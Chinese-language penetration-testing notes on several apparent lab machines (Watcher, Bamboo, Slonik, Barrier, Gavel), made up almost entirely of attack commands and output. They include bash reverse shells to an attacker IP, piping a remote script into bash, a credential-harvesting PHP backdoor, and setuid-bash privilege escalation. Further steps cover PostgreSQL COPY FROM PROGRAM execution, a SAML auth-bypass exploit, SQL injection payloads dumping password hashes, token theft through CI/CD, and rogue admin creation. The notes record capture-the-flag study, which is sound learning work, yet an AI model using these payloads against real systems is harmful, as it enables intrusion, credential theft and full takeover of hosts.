## Linux_Medium
### https:// ippsec.rocks 搜索关键词漏洞 
### https://crackstation.net 解编码

#### 通过Web的404可以知道web的框架；如Flask为python;flask-unsign是用来解析Flask应用的签名cookie的
```
Google搜索：0xdf 404 templates

https://0xdf.gitlab.io/cheatsheets/404
```
```
在这种 Flask 轻量项目里，最常见几种是：  
方式	      典型文件
SQLite:	  db.sqlite3, database.db
JSON存储	: db.json, users.json, data.json
YAML:     config.yaml
```
#### tcpwrapped 是：端口 被访问控制保护；可能只允许 本机访问 (127.0.0.1)
#### 子域名爆破
```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
```

<details>
<summary>反弹</summary>
	
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'


python3 -c 'import pty;pty.spawn("/bin/bash")'
web@Imagery:~/web$ ^Z
[1]+  Stopped                 nc -lvnp 9011
[★]$ stty raw -echo;fg
nc -lvnp 9011
             export TERM=xterm

[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
```
</details>

#### env
```
[★]$ python3 -m venv .venv
[★]$ source .venv/bin/activate
```
----------------------------------------------------------------------------------
#### Form Watcher
<details>
<summary>rsa_id; index.php后门</summary>

```
// Backdoor 手动插入后门好酷
	  $file = fopen("creds.txt", "a+");
 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n"); //$_POST['name'] 表单用户名
 	header("Location: http://127.0.0.1/index.php");
 	fclose($file);	  

//关于私钥
zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh //-p:如果父目录不存在就一起创建
zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N "" //-N ""空密码
zabbix@watcher:/var/lib/zabbix$ cd .ssh
zabbix@watcher:/var/lib/zabbix/.ssh$ ls
id_rsa	id_rsa.pub
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys //把 公钥写入授权列表
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
[★]$ vi id_rs
[★]$ chmod 600 id_rsa //-rw-------
[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
```
</details>

----------------------------------------------------------------------------------
#### Form Bamboo
<details>
<summary>Web_squid代理端口</summary>

```
端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口

[1] 设置代理[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf //需注释掉：#socks4 	127.0.0.1 9050

[2]用 curl 测试 HTTP 的命令 ｜ 你 → Squid代理(3128) → 内网端口9191
[★]$ proxychains4 curl -v http://10.129.238.16:9191

[3] burpsuite代理访问 127.0.0.1:9191/user 
$ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
Destination host    *
Proxy host          10.129.238.16
Proxu port          3128
要关掉拦截 Proxy → Intercept → Intercept is off ！！！！

linpeas 是一个自动化的本地 Linux 枚举脚本 //找路径
[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash

在burpsuite代理登录 http://127.0.0.1:9191/app?service=page/SetupCompleted 即可绕过登录

pspy :无 root 权限也能监控系统进程的工具
[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers -> Refresh servers

[★]$ nc -lvnp 5544
$ script /dev/null -c /bin/bash
bash-5.1$ cd tmp
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
bash-5.1$ /bin/bash -p
bash-5.1# id
```
</details>

----------------------------------------------------------------------------------
#### psql数据库 From Slonik
<details>
<summary>postgres</summary>

```
所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
showmount -e将列出NFS上可用的挂载点（份额）：
[★]$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *

[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash

service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history

service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf

//数据库 postgres
[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
[★]$ psql -h /tmp -U postgres
postgres=# \du
postgres=# \c
postgres=# \l
postgres=# \c service
service=# \dt
service=# select * from users;

service=# CREATE TABLE cmd(output text); 
service=# COPY cmd FROM  PROGRAM 'id'; 
COPY 1
service=# select * from cmd; 
service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
COPY 0
service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
COPY 0

[~][★]$ ssh-keygen -t ed25519 //本地生成公钥
[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
```
</details>

----------------------------------------------------------------------------------
#### 'Kubernetes = K8s' From Giveback
----------------------------------------------------------------------------------
#### GitLab From Barrier
<details>
<summary>GitLab API 枚举用户</summary>

```
GitLab API 枚举用户
---------------------------------------------------------------------------
//在gitconnect.py
auth_data = {
          'grant_type': 'password',
          'username': 'satoru',
          'password': 'dGJ2V72SUEMsM3Ca'
    }
//手动获得access token
//获取token_type:"Bearer"
[★]$ curl -sk https://gitlab.barrier.vl/oauth/token -d "grant_type=password&username=satoru&password=dGJ2V72SUEMsM3Ca"
//用作Bearer列出用户的令牌
[★]$ curl -sk --header "Authorization: Bearer glpat-***********" "https://gitlab.barrier.vl/api/v4/users?per_page=100" | jq .
---------------------------------------------------------------------------
```
</details>

<details>
<summary>拦截GET cookie</summary>

```
拦截GET cookie：点击了'Gitlab',本地网络，点击‘Advanced...','Accept the Risk and Continue'
---------------------------------------------------------------------------
GET /users/auth/saml/callback?SAMLResponse=URL
解码：CyberChef：URL Decode 去掉%xx | From Base64	还原二进制 | Raw Inflate	解压（zlib/deflate）
CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!

[★]$ vi saml.xml
[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
[★]$ pip3 install lxml
[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
[★]$ cat response_patched.xml

编码:CyberChef: Raw Deflate	压缩 | To Base64	编码 | URL Encode 变成 HTTP 可传输
CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars"
---------------------------------------------------------------------------
只Send，不要forward(HTTP History 存在的意义)，将2个cookie粘贴到'Accept the Risk and Continue'后面新的页面
另外：%3D%3D 要变成 ==（URL解码）
```
</details>

<details>
<summary>CI/CD：得到AUTHENTIK_TOKEN，即Authentik 令牌</summary>
	
```
CI/CD：得到AUTHENTIK_TOKEN，即Authentik 令牌
---------------------------------------------------------------------------
在akdamin的下面‘admin' -> 'CI/CD' -> 'Runners' -> '#1 (sT3k7uGUy)':	Tags: auto_5e7f
[1]查看'Runners'部分，#1 (sT3k7uGUy) 点击“Resume”来激活运行器
[2]将创建一个新项目:	'Overview' -> 'projects' -> 'New Project' -> 'Create blank project'：	输入Tags: auto_5e7f
[3]new file :
#.gitlab-ci.yml

image:
    name: redis:alpine
    pull_policy: if-not-present

stages:
  - build 

job_build:
  stage: build
  script:
    - env
  tags:
    - auto_5e7f
[4]将.gitlab-ci.yml文件：'Download'后‘Upload new file'
[5]查看“Jobs”部分，那里应该已经有一个名为“job_build”的新任务，得到AUTHENTIK_TOKEN，即Authentik 令牌
98 AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```
</details>

<details>
<summary>认证中心Authentik 令牌 创建Superadmin用户</summary>
	
```
认证中心Authentik 令牌
---------------------------------------------------------------------------
https://api.goauthentik.io/reference/core-users-list/
---------------------------------------------------------------------------
//查看用户
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
//创建用户
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "username": "superadmin", "name": "superadmin"}' jq
//设置密码
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "password": "Pa$$word123!"}'
//加入用户组akadmin
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "pk": 36}'
//再次查看用户组
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
```
</details>

<details>
<summary>-oHostKeyAlgorithms=+ssh-rsa 强制 SSH 客户端“允许使用 ssh-rsa 这种旧算法”，现在使用的是使用的是 SHA-1</summary>
	
```
登录 Authentik：https://barrier.vl:9443
---------------------------------------------------------------------------
在仪表板的右上角，点击“Admin interface” -> Directory -> Users -> 点击 maki的‘Impersonate' -> 点击 ‘Guacamole',找到终端‘>_ Maintenance'

maki@barrier:/etc/guacamole$ cat guacamole.properties
# MySQL properties
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: guac2024
<SNIP>

maki@barrier:/etc/guacamole$ mysql -u guac_user -p guac2024 guac_db
MariaDB [guac_db]>

MariaDB [guac_db]> show tables;
| guacamole_sharing_profile_permission  |

MariaDB [guac_db]> select * from guacamole_connection_parameter;
| connection_id | parameter_name | parameter_value
|             1 | port           | 22
|             2 | passphrase     | 3V32FN6oViMPxyzC 		<--- 神奇的是这个密码和 RSA一起使用
|             2 | port           | 22
|             2 | private-key    | -----BEGIN RSA PRIVATE KEY-----
<SNIP>
-----END RSA PRIVATE KEY-----
|             2 | username       | maki_adm


[★]$ chmod 600 maki_adm

[★]$ ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa 		
The authenticity of host 'barrier.vl (10.129.234.46)' can't be established.
RSA key fingerprint is SHA256:GCkGAQTxizCkIcpuBSCr79rJ/Al5wn745cwFDs+dY4A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'barrier.vl' (RSA) to the list of known hosts.
Enter passphrase for key 'maki_adm': 3V32FN6oViMPxyzC 
<SNIP>
maki_adm@barrier:~$
```
</details>

----------------------------------------------------------------------------------
#### '~$ RULE_PATH=/home/auctioneer/php.ini gavel-util submit item.yaml' From Gavel
<details>
<summary>gitdumper</summary>

```
--------------------------------------------------------------
[★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ
.git                    [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1791ms]
//使用 gitdumper 来获取该应用程序的源代码
[★]$ wget https://raw.githubusercontent.com/arthaud/git-dumper/refs/heads/master/git_dumper.py
[★]$ chmod +x git_dumper.py
[★]$ python3 git_dumper.py http://gavel.htb/.git/ git
--------------------------------------------------------------
```
</details>

<details>
<summary>SQL PDO && burpsuite</summary>

```
--------------------------------------------------------------
[★]$ cat inventory.php
else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
--------------------------------------------------------------
Burpsuite 进行排序时拦截对 inventory.php 的请求
首先先切换到‘quantity'，Setting本地流量，切换'name'拦截 -> 直接在Pretty输入 -> Setting恢复网络 -> Forward
--------------------------------------------------------------
//数据库中的表
user_id=item_name`%20FROM%20(SELECT%20table_name%20AS%20`%27item_name`%20from%20information_schema.tables)y;--&sort=\?--%00
//数据组表的数量
user_id=item_name`%20FROM%20(SELECT%20COUNT(*)%20AS%20`%27item_name`%20from%20information_schema.tables%20where%20table_schema=database())y;--&sort=\?--%00
//从“users”表中提取用户名和密码字
user_id=item_name`%20FROM%20(SELECT%20CONCAT_WS(0x3a,%20id,%20username,%20password)%20AS%20`%27item_name`%20from%20users)y;--&sort=\?--%00
--------------------------------------------------------------
[★]$ cat hash
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ hashcat -m 3200 hash rockyou.txt
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS:midnight1
--------------------------------------------------------------
```
</details>

<details>
<summary>gavel-util二进制文件</summary>

```
--------------------------------------------------------------
//查看一下这个组所拥有的文件
auctioneer@gavel:/var/www/html/gavel/includes$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
auctioneer@gavel:/var/www/html/gavel/includes$ find / -group gavel-seller 2>/dev/null
/run/gaveld.sock
/usr/local/bin/gavel-util
--------------------------------------------------------------
auctioneer@gavel:/$ cd ~
auctioneer@gavel:~$ file /usr/local/bin/gavel-util
/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped
--------------------------------------------------------------
auctioneer@gavel:~$ /usr/local/bin/gavel-util
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
--------------------------------------------------------------
auctioneer@gavel:~$ ps aux | grep gavel
root        1000  0.0  0.0  19128  3848 ?        Ss   07:56   0:00 /opt/gavel/gaveld
root        1011  0.4  0.4  26784 18488 ?        Ss   07:56   1:08 python3 /root/scripts/timeout_gavel.py
auction+   45987  0.0  0.0   6968  2556 pts/1    S+   12:08   0:00 grep gavel
--------------------------------------------------------------
auctioneer@gavel:/opt/gavel$ ls -la
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3  2025 gaveld
-rw-r--r-- 1 root root   364 Sep 20  2025 sample.yaml
drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
--------------------------------------------------------------
auctioneer@gavel:/opt/gavel$ ls
gaveld	sample.yaml  submission
auctioneer@gavel:/opt/gavel$ python3 -m http.server 8011
Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
--------------------------------------------------------------
```
</details>

<details>
<summary>Ghidra --> -rwxr-xr-- 1 root root 35992 Oct  3  2025 gaveld</summary>

```
--------------------------------------------------------------
[★]$ wget http://10.129.242.203:8011/gaveld
--------------------------------------------------------------
在 Ghidra 中打开它，来查看解码后的源代码。
[★]$ ghidra        //它是一个项目制工具（Project-based）

创建 Project
打开后：
点击：
File → New Project
选择：        Non-Shared Project
取名字，比如： gavel

导入二进制文件
点击：File → Import File
然后选：/opt/gavel/gaveld

双击 gaveld
进入分析界面（CodeBrowser）
一定要点：✔ Analyze（自动分析，非常关键）
//查看程序树，有一个名为“php_safe_run”的函数，看起来挺有意思的。
//Program Tree -> Symbol Tree -> Functions -> php_safe_run
--------------------------------------------------------------
 json_object_object_get_ex(param_1,&DAT_00105004,&local_3100);
  if (((local_3100 == 0) || (iVar1 = json_object_is_type(local_3100,4), iVar1 == 0)) ||
     (iVar1 = json_object_object_get_ex(local_3100,"RULE_PATH",local_30f8), iVar1 == 0)) {
    strncpy(local_3048,"/opt/gavel/.config/php/php.ini",0x1000);
    local_2049 = 0;
  }

如果 (没有 RULE_PATH)
    用默认路径 /opt/gavel/.config/php/php.ini
否则
    用你提供的 RULE_PATH

//默认路径被设置为：/opt/gavel/.config/php/php.ini
//用户可以控制 RULE_PATH
--------------------------------------------------------------
auctioneer@gavel:/$ cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off

// system() 函数及其他危险函数被禁用
--------------------------------------------------------------
```
</details>

<details>
<summary>加载自己的 php.ini 文件</summary>

```
--------------------------------------------------------------
auctioneer@gavel:/$ cd ~
auctioneer@gavel:~$ cp /opt/gavel/.config/php/php.ini .
auctioneer@gavel:~$ sed -i 's/disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client/disable_functions=/g' php.ini
--------------------------------------------------------------
//创建一个新的 YAML 文件来提交恶意规则。
auctioneer@gavel:~$ cat << 'EOF' > item.yaml
> name: Exploit
> description: Exploiting
> image: test.png
> price: 1
> rule_msg: Exploiting
> rule: |
>   system('cat /root/root.txt > /home/auctioneer/root.txt');
>   return true;
> EOF
--------------------------------------------------------------
用了 system() 函数将根标志复制到 /home/auctioneer/ 目录下
//使用“gavel-util”二进制文件提交该规则
auctioneer@gavel:~$ RULE_PATH=/home/auctioneer/php.ini gavel-util submit item.yaml
Item submitted for review in next auction

auctioneer@gavel:~$ ls
item.yaml  php.ini  root.txt  user.txt
auctioneer@gavel:~$ cat /home/auctioneer/root.txt
--------------------------------------------------------------
```
</details>

----------------------------------------------------------------------------------
